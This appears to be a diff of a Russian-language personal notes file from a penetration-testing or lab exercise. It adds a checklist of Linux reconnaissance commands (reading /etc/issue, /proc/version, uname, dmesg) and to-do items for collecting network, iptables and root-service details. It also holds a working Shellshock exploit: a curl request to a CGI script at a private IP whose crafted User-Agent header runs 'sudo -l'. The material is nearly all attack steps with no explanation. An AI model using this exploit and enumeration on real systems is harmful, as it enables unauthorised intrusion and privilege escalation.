@@ -1,3 +1,20 @@
+Информация о системе в txt-файле:
+
+        дистрибутив;
+            cat /etc/issue
+           cat /etc/*-release
+       версия ядра и разрядность;
+                   cat /proc/version
+                 uname -a
+                  uname -mrs
+                    rpm -q kernel
+                   dmesg | grep Linux
+                    ls /boot | grep vmlinuz-
+        информация о сетевом интерфейсе;
+        табличка iptables;
+        первые 5 сервисов с рут-правами.
+
+
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
 
